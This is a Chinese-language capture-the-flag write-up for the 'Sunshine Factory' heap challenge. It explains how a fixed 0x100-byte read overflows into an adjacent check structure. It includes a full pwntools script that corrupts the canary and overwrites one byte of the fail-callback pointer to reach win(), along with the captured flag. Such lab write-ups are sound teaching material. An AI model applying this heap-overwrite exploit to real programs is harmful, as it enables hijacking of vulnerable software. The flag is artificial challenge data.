# Greycademy2025 Sunshine Factory

## 题目简述

程序依次在堆上分配用户内容、带随机 Canary 和失败回调的检查结构、以及保存二者指针的 sunshine 结构。无论用户申请多小，程序都向内容区读取 `0x100` 字节，因此可越界破坏相邻检查块。

## 解题过程

检查结构为：

```c
struct checking_struct {
    char canary[8];
    void (*check_fail_fn)(void);
};
```

释放时若 Canary 不匹配，程序会调用 `check_fail_fn`。二进制启用 PIE，但 `check_heap_fail` 与 `win` 在同一映像页内，符号低 12 位分别是 `0x2a9` 和 `0x2ca`。ASLR 不改变页内偏移，因此只覆盖函数指针最低字节为 `0xca` 即可把失败路径转到 `win`，无需泄漏 PIE 基址。

申请 16 字节时，glibc 为用户块分配 `0x20` 大小的 chunk。相邻 checker chunk 的布局如下：

```text
偏移 0x10：下一块 prev_size
偏移 0x18：下一块 size，保持为 0x21
偏移 0x20：checker.canary，故意改坏
偏移 0x28：checker.check_fail_fn，最低字节改为 0xca
```

本地验证：

```python
from pwn import *

context.arch = "amd64"
p = process("./sunshinefactory")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"size needed: ", b"16")

payload = flat({
    0x10: 0,
    0x18: 0x21,
    0x20: 0,
}) + b"\xca"

p.sendafter(b"content: ", payload)
p.sendlineafter(b"> ", b"2")
p.sendline(b"cat flag.txt; exit")
print(p.recvall().decode())
```

Canary 比较失败后实际调用 `win`，取得：

```text
grey{th3_L1gHt_hURtS_mY_3y35}
```

## 方法总结

这里不是绕过 Canary，而是主动触发它并劫持失败回调。利用时必须保留相邻 chunk 的 size 元数据，否则还没走到自定义检查就可能被分配器终止。PIE 只随机化映像基址；同页函数间的一字节偏移关系保持不变，所以部分覆盖能在没有地址泄漏的情况下稳定生效。
